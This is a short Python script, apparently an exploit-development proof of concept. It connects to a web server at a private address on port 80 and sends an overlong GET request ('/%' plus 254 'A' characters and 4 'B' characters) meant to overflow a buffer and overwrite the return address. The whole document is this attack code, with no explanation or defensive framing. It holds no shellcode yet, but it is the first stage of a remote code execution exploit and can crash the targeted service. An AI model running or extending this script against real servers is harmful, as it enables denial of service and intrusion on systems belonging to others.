#!/usr/bin/python
import socket

target_address="192.168.100.118"
target_port=80

badbuffer = "A" * 254
badbuffer+= "B" * 4
httpmethod = "GET"

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n'

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()

